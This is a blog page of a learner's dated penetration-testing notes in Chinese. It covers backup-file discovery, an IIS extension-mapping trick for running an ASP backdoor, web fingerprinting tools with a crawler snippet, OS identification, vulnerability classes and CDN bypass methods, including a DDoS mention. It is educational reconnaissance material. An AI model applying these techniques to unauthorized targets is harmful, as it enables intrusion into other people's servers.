<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>2021-9-4开学笔记 | Gridea</title>
<meta name="description" content="温故而知新">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1638358535496">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">


<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>


<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />


  </head>
  <body>
  
    <nav class="navbar border fixed split-nav">
  <div class="nav-brand">
    <h3><a href="https://jinqipiaopiao.github.io/">Gridea</a></h3>
  </div>
  <div class="collapsible">
    <input id="collapsible1" type="checkbox" name="collapsible1">
    <button>
      <label for="collapsible1">
        <div class="bar1"></div>
        <div class="bar2"></div>
        <div class="bar3"></div>
      </label>
    </button>
    <div class="collapsible-body">
      <ul class="inline">
        
          <li>
            
              <a href="/" class="menu">
                首页
              </a>
            
          </li>
        
          <li>
            
              <a href="/archives" class="menu">
                归档
              </a>
            
          </li>
        
          <li>
            
              <a href="/tags" class="menu">
                标签
              </a>
            
          </li>
        
          <li>
            
              <a href="/post/about" class="menu">
                关于
              </a>
            
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div id="top" class="row site">
      <div class="sm-12 md-8 col">
        <div class="paper">
          <article class="article">
            <h1>2021-9-4开学笔记</h1>
            <p class="article-meta">
              2021-09-13
              
            </p>
            
            <div class="post-content">
              <h1 id="2021-09-13">2021-09-13</h1>
<p>ip访问与域名访问有什么差别：（域名访问的时IP访问的真子集，IP访问的是根目录，域名访问的是根目录下的站点目录）</p>
<p>IP地址访问的时候是访问的www文件下的<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504961949.png" alt="" loading="lazy"></p>
<p>而用域名访问的时候是特定的文件夹，是www文件下的一个文件<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504967445.png" alt="" loading="lazy"></p>
<p>IP地址访问的话就能扫到网站同一目录下的文件夹，包括数据备份文件和一下看不到的文件，因为一般人就把网站的备份文件就放在与网站同一目录下，如果用域名访问的话就不能扫到文件，而如果用IP地址扫描的话就能扫到了网站的备份文件</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1631504973512.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504977621.png" alt="" loading="lazy"><br>
添加这个东西之后放一个后缀名为xiaodi8的文件就能自动解析为asp文件（放一个asp后门）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504981216.png" alt="" loading="lazy"><br>
然后进行连接即可看见文件内部结构</p>
<p>文件夹属性<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504984321.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504988237.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504992831.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1631504996809.png" alt="" loading="lazy"></p>
<p>无：<br>
此时绕过思路就是换目录<br>
设置根目录的话就不科学，因为它里面正常文件有脚本型文件所以上面所述的给予无权限一般只给images文件加的权限<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631505001278.png" alt="" loading="lazy"></p>
<p>通过数据包的返回即可知道搭建的平台<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631505005537.png" alt="" loading="lazy"></p>
<h1 id="2021-09-14">2021-09-14</h1>
<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1631668904883.png" alt="" loading="lazy"></figure>
<p>本文通过分析web指纹的检测对象、检测方法、检测原理及常用工具，设计了一个简易的指纹搜集脚本来协助发现新指纹，并提取了多个开源指纹识别工具的规则库并进行了规则重组，开发了一个简单快捷的指纹识别小工具TideFinger，并实现了一套在线的指纹识别平台“潮汐指纹”，希望能为大家带来方便。</p>
<p>前言<br>
在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。</p>
<p>在指纹识别的学习过程中，借用了很多开源的工具和指纹库，如fofa、WhatWeb、w11scan、WebEye、御剑等等，在此感谢各种大佬的无私奉献。本文并无技术上的创新和突破，只是把一些指纹库重新进行了整合和梳理并进行了开源。</p>
<p>tips：文末有福利<sub>我们将搜集到的一些指纹工具、指纹库等资料打包供大家下载</sub></p>
<p>常见指纹检测的对象<br>
1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；</p>
<p>2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；</p>
<p>3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；</p>
<p>4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；</p>
<p>5、开发语言：比如PHP、Java、Ruby、Python、C#等；</p>
<p>6、操作系统信息：比如linux、win2k8、win7、kali、centos等；</p>
<p>7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；</p>
<p>8、WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等；</p>
<p>9、IP及域名信息：IP和域名注册信息、服务商信息等；</p>
<p>10、端口信息：有些软件或平台还会探测服务器开放的常见端口。</p>
<p>常见的指纹识别方式<br>
1、特定文件的MD5<br>
一些网站的特定图片文件、js文件、CSS等静态文件，如favicon.ico、css、logo.ico、js等文件一般不会修改，通过爬虫对这些文件进行抓取并比对md5值，如果和规则库中的Md5一致则说明是同一CMS。这种方式速度比较快，误报率相对低一些，但也不排除有些二次开发的CMS会修改这些文件。</p>
<p>2、正常页面或错误网页中包含的关键字<br>
先访问首页或特定页面如robots.txt等，通过正则的方式去匹配某些关键字，如Powered by Discuz、dedecms等。</p>
<p>或者可以构造错误页面，根据报错信息来判断使用的CMS或者中间件信息，比较常见的如tomcat的报错页面。</p>
<p>3、请求头信息的关键字匹配<br>
根据网站response返回头信息进行关键字匹配，whatweb和Wappalyzer就是通过banner信息来快速识别指纹，之前fofa的web指纹库很多都是使用的这种方法，效率非常高，基本请求一次就可以，但搜集这些规则可能会耗时很长。而且这些banner信息有些很容易被改掉。</p>
<p>根据response header一般有以下几种识别方式：</p>
<p>（1）查看http响应报头的X-Powered-By字段来识别；</p>
<p>（2）根据Cookies来进行判断，比如一些waf会在返回头中包含一些信息，如360wzws、Safedog、yunsuo等；</p>
<p>（3）根据header中的Server信息来判断，如DVRDVS-Webs、yunjiasu-nginx、Mod_Security、nginx-wallarm等；</p>
<p>（4）根据WWW-Authenticate进行判断，一些路由交换设备可能存在这个字段，如NETCORE、huawei、h3c等设备。</p>
<p>4、部分URL中包含的关键字，比如wp-includes、dede等URL关键特征<br>
通过规则库去探测是否有相应目录，或者根据爬虫结果对链接url进行分析，或者对robots.txt文件中目录进行检测等等方式，通过url地址来判别是否使用了某CMS，比如wordpress默认存在wp-includes和wp-admin目录，织梦默认管理后台为dede目录，solr平台可能使用/solr目录，weblogic可能使用wls-wsat目录等。</p>
<p>5、开发语言的识别<br>
web开发语言一般常见的有PHP、jsp、aspx、asp等，常见的识别方式有：</p>
<p>（1）通过爬虫获取动态链接进行直接判断是比较简便的方法。</p>
<pre><code>asp判别规则如下 &lt;a[^&gt;]*?href=('|&quot;)[^http][^&gt;]*?\.asp(\?|\#|\1) ，其他语言可替换相应asp即可。
</code></pre>
<p>（2）通过 X-Powered-By 进行识别</p>
<p>比较常见的有 X-Powered-By: ASP.NET 或者 X-Powered-By: PHP/7.1.8</p>
<p>（3）通过 Set-Cookie 进行识别</p>
<p>这种方法比较常见也很快捷，比如 Set-Cookie 中包含 PHPSSIONID 说明是php、包含 JSESSIONID 说明是java、包含 ASP.NET_SessionId 说明是aspx等。</p>
<p>指纹识别工具<br>
在研究指纹识别技术的时候，不可避免的分析了大量指纹识别工具，在此将自己用过的几个感觉不错的工具和平台介绍一下。</p>
<p>国外指纹识别工具<br>
WhatWeb（推荐指数★★★★★）</p>
<pre><code>下载地址： https://github.com/urbanadventurer/WhatWeb
</code></pre>
<p>Whatweb 是一个开源的网站指纹识别软件，拥有超过1700+个插件，它能识别的指纹包括 cms 类型、博客平台、网站流量分析软件、javascript 库、网站服务器，还可以识别版本号、邮箱地址、账户 id、web 框架模块等。</p>
<p>Whatweb 是基于 ruby 语言开发，因此可以安装在具备 ruby 环境的系统中，目前支持 Windows/Mac OSX/Linux。</p>
<pre><code>在debian/ubuntu系统下可直接`apt-get install whatweb`,kali已自带。
使用非常简单whatweb http://www.tidesec.net 即可，也可以加参数-v显示更详细的信息。
</code></pre>
<p>Wapplyzer（推荐指数★★★★）</p>
<pre><code>下载地址： https://github.com/AliasIO/Wappalyzer
</code></pre>
<p>Wappalyzer 是一个实用的跨平台网站分析工具，用于帮助开发者、研究者和设计者检测网页使用的是什么技术，以更好地衡量自己的项目中该使用什么技术。Wappalyzer 的功能和 BuiltWith 类似，可检测内容管理系统（CMS），电子商务平台、Web服务器、JavaScript框架和已安装的分析工具等。</p>
<p>Wappalyzer可直接在chrome或火狐的应用商城直接搜索安装。Wappalyzer目前可识别65个大类的1216个应用，查看可检测的应用程序列表：</p>
<pre><code>https://wappalyzer.com/applications
</code></pre>
<p>Whatruns（推荐指数★★★★）</p>
<p>Whatruns是为chrome开发的一款web指纹识别程序，还可以显示托管的CDN、wordpress插件、wordpress字体等，拥有丰富的插件支持。</p>
<p>跟Wappalyzer安装类似，Whatruns可直接在chrome应用商城直接搜索安装。</p>
<p>安装完成后，通过插件图标来获取服务的详细运行信息，效果如下。有时候信息会比Wapplyzer还详细一些，但有时候获取速度稍慢。</p>
<p>Plecost（推荐指数★★★）</p>
<pre><code>下载地址： https://github.com/iniqua/plecost
</code></pre>
<p>Plecost是Wordpress博客引擎的漏洞指纹识别和漏洞查找器，能识别Wordpress版本并能查找到cve，不过访问不了google的话可能有些功能就受限了。Plecost基于python架构，利用了Beautiful Soup来解析html、xml文件识别网站使用的插件及版本。</p>
<pre><code>使用也比较方便 plecost -i /usr/share/plecost/wp_plugin_list.txt http://www.freebuf.com
</code></pre>
<p>BlindElephant（推荐指数★★）</p>
<pre><code>下载地址： https://github.com/lokifer/BlindElephant
</code></pre>
<p>BlindElephant是一款Web应用程序指纹识别工具。该工具可以读取目标网站的特定静态文件，计算其对应的哈希值，然后和预先计算出的哈希值做对比，从而判断目标网站的类型和版本号。目前，该工具支持15种常见的Web应用程序的几百个版本。同时，它还提供WordPress和Joomla的各种插件。该工具还允许用户自己扩展，添加更多的版本支持。</p>
<p>不过该软件最新更新是在2013年，插件库应该算比较旧的了。</p>
<pre><code>下载及安装可参考 https://github.com/lokifer/BlindElephant ，kali中已经内置。

使用命令： BlindElephant.py http://www.freebuf.com wordpress
</code></pre>
<p>国内指纹识别工具<br>
御剑web指纹识别程序</p>
<pre><code>下载地址： https://www.webshell.cc/4697.html
</code></pre>
<p>御剑web指纹识别程序是御剑大神开发的一款CMS指纹识别小工具，该程序由.NET 2.0框架开发，配置灵活、支持自定义关键字和正则匹配两种模式、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快、但目前比较明显的缺陷是指纹的配置库偏少。</p>
<p>windows下图形界面，比较亲民，扫描速度略慢，指纹库略少，可手工更新。</p>
<p>Test404轻量WEB指纹识别</p>
<pre><code>下载地址： https://www.test404.com/post-1618.html
</code></pre>
<p>Test404轻量WEB指纹识别程序是一款CMS指纹识别小工具，配置灵活、支持自行添加字典、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快。可手动更新指纹识别库，而且该软件在2019.04月刚刚更新了一版。</p>
<p>w11scan分布式WEB指纹识别平台</p>
<p>w11scan是一款分布式的WEB指纹识别系统（包括CMS识别、js框架、组件容器、代码语言、WAF等等），管理员可以在WEB端新增/修改指纹，建立批量的扫描任务，并且支持多种搜索语法。</p>
<pre><code>安装和下载可参考： https://github.com/w-digital-scanner/w11scan
</code></pre>
<p>手工安装稍微复杂，不过作者提供了docker部署，方便很多，使用了Mongodb，内置了1800多条常见的指纹，可以识别多达538种常见CMS，当然也可以手工添加指纹。</p>
<p>Dayu指纹识别工具</p>
<pre><code>下载地址： https://github.com/Ms0x0/Dayu
</code></pre>
<p>“大禹”为一款c/s结构jar文件工具，只需本地安装java环境，加参数-u即可，具体设置参数可参考github介绍。</p>
<p>WebEye</p>
<pre><code>下载地址： https://github.com/zerokeeper/WebEye/
</code></pre>
<p>WebEye可快速简单地识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架，使用异步实现指纹的快速识别。</p>
<p>识别速度比较快，不过指纹库不是很多，指纹库不是基于md5之类的，而是类似于fofa通过http头信息、关键字等进行快速识别。</p>
<p>作者对指纹进行了分类，如摄像头、waf、cdn、网络设备等，很多指纹都是精心搜集的。</p>
<p>WTF_Scan</p>
<pre><code>下载地址： https://github.com/dyboy2017/WTF_Scan
</code></pre>
<p>WTF团队出品的指纹识别平台，包括的功能也相对比较多，除了指纹识别外，还有DNS解析、子域名、CDN、端口扫描、敏感目录等。</p>
<p>不过就单独说指纹规则来说，不算很多，可以自己添加完善，在 WTF_Scan/wtf/app/api/cms/cms.txt 文件中进行指纹修改。</p>
<p>Webfinger</p>
<p>基于fofa的规则库进行快速检索，大约2000+条指纹数据，位于lib/web.db可自行添加修改。</p>
<pre><code>下载地址： https://github.com/se55i0n/Webfinger

类似的还有个CMSCAN https://github.com/cuijianxiong/cmscan/
</code></pre>
<p>FingerPrint</p>
<p>好像是百度的一个MM用perl写的一款工具，调用Wappalyzer模块进行指纹识别。</p>
<pre><code>下载地址： https://github.com/tanjiti/FingerPrint
</code></pre>
<p>在线指纹识别<br>
云悉指纹识别</p>
<pre><code>http://www.yunsee.cn/
</code></pre>
<p>指纹库很强大，速度也很快，我们前端还仿了下云悉的界面，免费服务，好像还能提供api接口，学习的榜样！</p>
<p>如果指纹能开源就好了，哈哈~~</p>
<p>bugscaner指纹识别</p>
<pre><code>http://whatweb.bugscaner.com/look/
</code></pre>
<p>目前好像指纹比较少，很多都识别不出来了。</p>
<pre><code>whatweb.net

https://whatweb.net/
</code></pre>
<p>之前功能还不错，现在好像只能查看到header信息了。</p>
<p>未知指纹发现<br>
目前新指纹的识别基本还是靠人工发现然后分析规则再进行添加，所以各平台都有提交指纹的功能，但是我们没有这种资源，只能另想办法。</p>
<p>于是想到了一个比较笨的方法：从网站中爬取一些静态文件，如png、ico、jpg、css、js等，提取url地址、文件名、计算md5写入数据库，这样再爬下一个网站，一旦发现有相同的md5，就把新的url也加入到那条记录中，并把hint值加1，这样爬取10W个站点后，就能得到一个比较客观的不同网站使用相同md5文件的数据了。</p>
<p>获取链接代码部分</p>
<pre><code>excludeext = ['.png', '.ico', '.gif','.svg', '.jpeg','js','css','xml','txt']

def getPageLinks(url):

try:
headers = requests_headers()

content = requests.get(url, timeout=5, headers=headers, verify=False).text.encode('utf-8')
links = []
tags = ['a', 'A', 'link', 'script', 'area', 'iframe', 'form']  # img
tos = ['href', 'src', 'action']
if url[-1:] == '/':
url = url[:-1]
try:
for tag in tags:
for to in tos:
link1 = re.findall(r'&lt;%s.*?%s=&quot;(.*?)&quot;' % (tag, to), str(content))
link2 = re.findall(r'&lt;%s.*?%s=\'(.*?)\'' % (tag, to), str(content))
for i in link1:
links.append(i)

for i in link2:
if i not in links:
links.append(i)

except Exception, e:
print e
print '[!] Get link error'
pass
return links
except:
return []
有兴趣的可以查看具体代码 https://github.com/TideSec/TideFinger/blob/master/count_file_md5.py 文件。
</code></pre>
<p>爬取的结果如下：</p>
<p>当然了，里面肯定很多都属于误报，比如上图中第一个其实是个500错误页面，所以出现的比较多，第二个是政府网站最下边那个常见的“纠错”的js，所以用的也比较多…</p>
<p>经过一些分析整理也发现了一些小众的CMS和建站系统的指纹，比如三一网络建站系统的 newsxx.php ，比如大汉JCM的 jhelper_tool_style.css 等等，后续会持续把这些新的指纹丰富到指纹库中去。</p>
<p>指纹识别脚本<br>
有了指纹库之后，识别脚本就相对比较简单了，已有的一些也都比较成熟了，直接使用了webfinger和whatcms的部分代码并进行了整合优化，于是就有了TideFinger。</p>
<p>1、功能逻辑都比较简单，先用fofa库去匹配，然后获取一定banner，如果banner中识别除了cms，则返回结果，如果未识别到cms，则会调用cms规则库进行匹配各规则。</p>
<p>2、脚本支持代理模式，当设置了-p参数，且 proxys_ips.txt 文件包含代理地址时，脚本会随机调用代理地址进行扫描，以避免被封ip，不过这样的话效率可能会低一些。毕竟搜集的免费代理质量还是差一些，速度会慢很多。有钱人可以找收费代理池，然后每个规则都用不同代理去请求，这样肯定不会被封！</p>
<p>代理地址的搜集可以使用我修改的另一个代理池 https://github.com/TideSec/Proxy_Pool ，提供了自动化的代理ip抓取+评估+存储+展示+接口调用。</p>
<p>3、经测试，一般网站把所有指纹跑一遍大约需要30秒时间，个别的网站响应比较慢的可能耗时更长一些，可以通过设置网站超时时间进行控制。</p>
<p>安装python2依赖库</p>
<pre><code>pip install lxml
pip install requests
pip install bs4
</code></pre>
<p>说明：sqlite3库在Python 2.5.x 以上版本默认自带了该模块，如提示sqlite3出错请自行排查。<br>
执行脚本</p>
<pre><code>$ python TideFinger.py

Usage: python TideFinger.py -u http://www.123.com [-p 1] [-m 50] [-t 5]

-u: 待检测目标URL地址
-p: 指定该选项为1后，说明启用代理检测，请确保代理文件名为proxys_ips.txt,每行一条代理，格式如: 124.225.223.101:80
-m: 指纹匹配的线程数，不指定时默认为50
-t: 网站响应超时时间，默认为5秒
</code></pre>
<p>指纹识别界面如下：</p>
<p>指纹识别平台<br>
在有了指纹库和识别脚本之后，我们想继续完善下这个功能，于是又加入了其他一些功能，有了这个在线指纹</p>
<pre><code>查询平台 http://finger.tidesec.net 。
</code></pre>
<p>开始想加的很多，但后来在速度和时间方面不得不进行了一定的取舍，于是就有了目前如下的功能。</p>
<p>1、网站信息：网站标题、状态码、302跳转信息等；</p>
<p>2、IP地址信息：IP归属地、IP服务商信息、GPS信息；</p>
<p>3、CDN识别：对目标是否使用CDN进行检测，但目前CDN识别指纹还不多，对部分识别出使用CDN的目标还会列出来CNAME；</p>
<p>4、中间件识别：主要通过http头信息中的XPB、server等字段获取中间件信息，如nginx、iis、tomcat等；</p>
<p>5、更多banner：主要是调用了whatweb和Wapplyzer进行更多banner信息的获取，如jquery、bootstrap等；</p>
<p>6、操作系统识别：识别比较简单，通过ttl值和文件大小写是否敏感…用nmap去识别的话速度太慢…</p>
<p>小福利<br>
1、指纹检测工具下载<br>
我们把上面的13款 指纹识别工具 和搜集到的一些 论文资料 进行了汇总打包，大家可以直接下载。</p>
<pre><code>下载地址：https://pan.baidu.com/s/190K34cwjAWDUMLtR8EWvNA 提取码：5y4o 解压密码www.tidesec.net
</code></pre>
<p>后续如有更新，会在我们公众号 TideSec安全团队 上提供下载，回复“指纹工具”即可获取最新指纹识别工具下载地址。</p>
<p>2、指纹库下载<br>
我们在GitHub上提供的是2019年4月的指纹库（还未进行大量的命中率测试），后续我们还会优化调整命中策略、未知指纹识别方法，持续更新优化指纹库。</p>
<pre><code>https://www.tuicool.com/articles/iQBnAvv

https://www.freebuf.com/articles/web/202560.html?utm_source=tuicool&amp;utm_medium=referral
</code></pre>
<p>————————————————<br>
版权声明：本文为CSDN博主「ArthurKingYs」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/u011001084/article/details/90199446</p>
<h1 id="2021-09-15">2021-09-15</h1>
<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1631670532262.png" alt="" loading="lazy"></figure>
<p>#操作系统层面</p>
<p><strong>识别操作系统常见方法：</strong><br>
1)将网站大小写混用如果相同说明是windows服务器搭建的否则就是linux，<br>
2)用nmap识别，<br>
<img src="https://jinqipiaopiao.github.io//post-images/1631672684636.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1631672689303.png" alt="" loading="lazy"><br>
3)TTL值来判断(不太准确一般不建议)<br>
(ping一下Linux系统的TTL值为64或255，<br>
Windows NT/2000/XP系统的TTL值为128，<br>
Windows 98系统的TTL值为32，<br>
UNIX主机的TTL值为255。)，</p>
<p><strong>2.简要两者区别及识别意义</strong><br>
1)首先盘的分布不一样<br>
2)文件放在不同的系统上所展现出来的也不一样<br>
3)识别的意义就是按照操作系统的不一样来运用不同的漏洞来作进一步的测试</p>
<p><strong>3.操作系统层面漏洞类型对应意义</strong><br>
1)操作系统漏洞分类</p>
<p>不同角度看安全漏洞的分类，对一个特定程序的安全漏洞可以从多方面进行分类。</p>
<p>操作系统漏洞分类1、从作用范围角度看分为</p>
<p>●远程漏洞，攻击者可以利用并直接通过网络发起攻击的漏洞。这类漏洞危害极大，攻击者能随心所欲的通过此漏洞操作他人的电脑。并且此类漏洞很容易导致蠕虫攻击，在Windows。</p>
<p>●本地漏洞，攻击者必须在本机拥有访问权限前提下才能发起攻击的漏洞。比较典型的是本地权限提升漏洞，这类漏洞在Unix系统中广泛存在，能让普通用户获得最高管理员权限。</p>
<p>操作系统漏洞分类2、从用户群体分类</p>
<p>●大众类软件的漏洞。如Windows的漏洞、IE的漏洞等等。</p>
<p>●专用软件的漏洞。如Oracle漏洞、Apache漏洞等等。</p>
<p>操作系统漏洞分类3、从数据角度看分为</p>
<p>●能读按理不能读的数据，包括内存中的数据、文件中的数据、用户输入的数据、数据库中的数据、网络上传输的数据等等。</p>
<p>●能把指定的内容写入指定的地方(这个地方包括文件、内存、数据库等)</p>
<p>●输入的数据能被执行(包括按机器码执行、按Shell代码执行、按SQL代码执行等等)</p>
<p>操作系统漏洞分类4、从触发条件上看可以分为</p>
<p>●主动触发漏洞，攻击者可以主动利用该漏洞进行攻击，如直接访问他人计算机。</p>
<p>●被动触发漏洞，必须要计算机的操作人员配合才能进行攻击利用的漏洞。比如攻击者给管理员发一封邮件，带了一个特殊的jpg图片文件，如果管理员打开图片文件就会导致看图软件的某个漏洞被触发，从而系统被攻击，但如果管理员不看这个图片则不会受攻击。</p>
<p>操作系统漏洞分类5、从操作角度看可分为</p>
<p>●文件操作类型，主要为操作的目标文件路径可被控制(如通过参数、配置文件、环境变量、符号链接灯)，这样就可能导致下面两个问题：</p>
<p>◇写入内容可被控制，从而可伪造文件内容，导致权限提升或直接修改重要数据(如修改存贷数据)，这类漏洞有很多，如历史上Oracle TNS LOG文件可指定漏洞，可导致任何人可控制运行Oracle服务的计算机;</p>
<p>◇内容信息可被输出，包含内容被打印到屏幕、记录到可读的日志文件、产生可被用户读的core文件等等，这类漏洞在历史上Unix系统中的crontab子系统中出现过很多次，普通用户能读受保护的shadow文件;</p>
<p>●内存覆盖，主要为内存单元可指定，写入内容可指定，这样就能执行攻击者想执行的代码(缓冲区溢出、格式串漏洞、PTrace漏洞、历史上Windows2000的硬件调试寄存器用户可写漏洞)或直接修改内存中的机密数据。</p>
<p>●逻辑错误，这类漏洞广泛存在，但很少有范式，所以难以查觉，可细分为：</p>
<p>◇条件竞争漏洞(通常为设计问题，典型的有Ptrace漏洞、广泛存在的文件操作时序竞争)</p>
<p>◇策略错误，通常为设计问题，如历史上FreeBSD的Smart IO漏洞。</p>
<p>◇算法问题(通常为设计问题或代码实现问题)，如历史上微软的Windows 95/98的共享口令可轻易获取漏洞。</p>
<p>◇设计的不完善，如TCP/IP协议中的3步握手导致了SYN FLOOD拒绝服务攻击。</p>
<p>◇实现中的错误(通常为设计没有问题，但编码人员出现了逻辑错误，如历史上博彩系统的伪随机算法实现问题)</p>
<p>●外部命令执行问题，典型的有外部命令可被控制(通过PATH变量，输入中的SHELL特殊字符等等)和SQL注入问题。</p>
<p>操作系统漏洞分类6、从时序上看可分为</p>
<p>●已发现很久的漏洞：厂商已经发布补丁或修补方法，很多人都已经知道。这类漏洞通常很多人已经进行了修补，宏观上看危害比较小。</p>
<p>●刚发现的漏洞：厂商刚发补丁或修补方法，知道的人还不多。相对于上一种漏洞其危害性较大，如果此时出现了蠕虫或傻瓜化的利用程序，那么会导致大批系统受到攻击。</p>
<p>●0day：还没有公开的漏洞，在私下交易中的。这类漏洞通常对大众不会有什么影响，但会导致攻击者瞄准的目标受到精确攻击，危害也是非常之大。</p>
<p><strong>影响范围</strong><br>
1)和权限挂钩，以便进一步进行相关渗透，或者就是简单的崩溃一下</p>
<h1 id="数据库层面">数据库层面</h1>
<p><strong>1.识别数据库类型常见方法</strong><br>
1)首先通过网站来识别数据库（asp+access，aspx+mssql，jsp+mssql | oracle，python+mongodb，php+mysql）<br>
2)端口扫描用nmap扫描操作系统时会出现响应端口以及状态(filtered由于报文无法到达指定的端口，open是开放，nmap不能够决定端口的开放状态)</p>
<h1 id="补充">补充</h1>
<p>出去常规web安全及app安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，附在均衡），也可以作为安全测试目标，此类目标测试原则只是少了web应用或其他安全问题，</p>
<h1 id="2021-09-23">2021-09-23</h1>
<p>#CDN的相关技术<br>
<strong>如何判断目标存在CDN服务?</strong><br>
通过ping.chinaz.com来看是否返回的地址都一样如果一样的话就说明没有cdn，如果不一样的话就说明存在相关技术<br>
利用多节点技术进行请求返回判断</p>
<p><strong>CDN对于安全测试有那些影响?</strong><br>
如果扫描的网站使用了cdn技术，那我们直接访问的可能不是对方的真实iIP，而是缓存服务器，即访问其真实服务器的时候会受到阻碍</p>
<p><strong>目前常见的CDN绕过技术有哪些?</strong><br>
子域名查询：网站管理者可能只在www.xxx.com设置了cdn服务，而在xxx.com没有设置cdn服务，可以使用超级ping进行验证：ping.chinaz.com</p>
<p>邮件服务查询：很多公司有自己的邮箱服务器，而邮箱服务器绝大多数不会设置cdn服务，可以通过给自己发送的邮件然后通过查看源码即可知道</p>
<p>国外地址请求：某些国家可能没有cdn服务器</p>
<p>遗留文件，扫描全网：通过访问遗留文件，可能发现其真实ip</p>
<p>黑暗引擎搜索特定文件：fofa、zoomeye、Shodan</p>
<p>dns历史记录，以量打量：查询以前还未设置CDN服务的IP地址；采用ddos攻击，通过消耗节点的IP地址，然后达到最后访问真实IP地址的情况。</p>
<p>CDN真实lP地址获取后绑定指向地址：当获取有可能的IP地址的时候通过修改本地hosts解析指向文件</p>
<p>更改木地HOST:解析指向文件</p>
<p>演示案例：<br>
1.利用子域名请求获取真实IP<br>
ping www.xuersi.com<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361964561.png" alt="" loading="lazy"><br>
ping xuersi.com<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361970513.png" alt="" loading="lazy"></p>
<p>2.利用国外地址请求获取真实ip（https://get-site-ip.com/ 查询 www.xueersi.com ）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361975125.png" alt="" loading="lazy"></p>
<p>3.利用第三方接口查询获取真实ip（https://get-site-ip.com）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361978600.png" alt="" loading="lazy"></p>
<p>4.利用邮件服务器接口获取真实ip<br>
以墨者学院注册邮件为例<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361983761.png" alt="" loading="lazy"></p>
<p>怎么通过邮件查询对方IP地址<br>
https://jingyan.baidu.com/article/c85b7a640c84d6003bac9527.html<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361987838.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361992202.png" alt="" loading="lazy"><br>
如何确定他的IP就是上述的IP呢？</p>
<p>(1)有人情味的方法:查备案地址、备案号<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361996144.png" alt="" loading="lazy"><br>
基本上可以确定其重庆的这个IP</p>
<p>(2) 通过修改本地host文件进行验证</p>
<p>思路：将我们想要测试的IP地址添加到host文件中进行测试，如果浏览器能打开这个网址，这个IP可能是我们要找的真实IP；如果不可以，就一定不是。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632361999939.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1632362005735.png" alt="" loading="lazy"></p>
<p>6.5 利用黑暗引擎搜索特定文件获取真实IP<br>
shodan</p>
<h1 id="2021-09-26">2021-09-26</h1>
<h1 id="信息收集-app及其他资产等">信息收集-app及其他资产等</h1>
<figure data-type="image" tabindex="3"><img src="https://jinqipiaopiao.github.io//post-images/1632612888336.png" alt="" loading="lazy"></figure>
<p>APP提取一键反编译提取</p>
<p>APP抓取数据包进行工具配合</p>
<p>各种第三方应用相关探针技术</p>
<p>各种服务接口信息相关探针技术</p>
<p>设计案例<br>
<strong>1.app提取及抓包及后续配合</strong><br>
某apk一键提取反编译（https://blog.csdn.net/afanbaby/article/details/76756109）<br>
利用burp历史抓更多url</p>
<p>每个数据包截断查看<br>
反编译查出来（少，不全）的url和burp查看的历史结合，找出更多的url</p>
<p><strong>2.某ip无web框架下的第三方测试</strong><br>
各种端口一顿乱扫-思路<br>
各种接口一顿乱扫-思路<br>
接口部分一顿乱扫-思路</p>
<p>45.33.42.112<br>
1.端口扫描：nmap，结果最好，但是满，网速慢，运行速度慢<br>
2.黑暗引擎搜索强大的引擎，开放的端口，端口可能对应的服务都能检测出来，shodan，钟馗之眼，fofa<br>
